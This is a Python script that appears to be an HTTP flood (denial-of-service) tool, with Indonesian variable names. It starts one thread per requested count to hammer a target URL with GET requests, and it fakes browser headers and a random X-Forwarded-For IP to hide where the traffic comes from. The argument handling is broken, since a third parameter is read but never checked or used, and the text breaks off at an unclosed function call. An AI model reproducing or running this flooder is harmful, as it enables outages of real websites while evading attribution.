import requests
import random
import threading
import sys
import time
from datetime import datetime

def random_string(length):
    characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(characters) for _ in range(length))

def random_ip():
    return f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def kirim_pengiriman(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1',  # Harus berupa string
        'cookie': 'cookie_value',
        'Origin': f"http://{random_string(10)}.com",
        'Referrer': f"http://google.com/{random_string(10)}",
        'X-Forwarded-For': random_ip()
    }
    try:
        response = requests.get(url, headers=headers)
        print(f"Response code: {response.status_code}")
    except Exception as e:
        print(f"Failed to get website data: {e}")

def main():
    if len(sys.argv) <= 2:
        print("Penggunaan: python bsv.py <url> <waktu>")
        sys.exit(-1)

    url = sys.argv[1]
    waktu = int(sys.argv[2])
    pps = int(sys.argv[3])

    benangs = []
    start_time = datetime.now()
    for _ in range(waktu):
        benang = threading.Thread(target=kirim_pengiriman, args=(url,))
        benang.start()
        benangs.append(benang)

    for benang in benangs:
        benang.join()

    end_time = datetime.now()
    elapsed_time = end_time - start_time
    total_packets = len(benangs)
    packets_per_second = total_packets / elapsed_time.total_seconds()

    print(f"Total packets: {total_packets}")
    print(f"Elapsed time: {elapsed_time.total_seconds()} seconds")
    print(f"Packets per second: {packets_per_second:.2f} PPS")

if __name__ == "__main__":
    main(
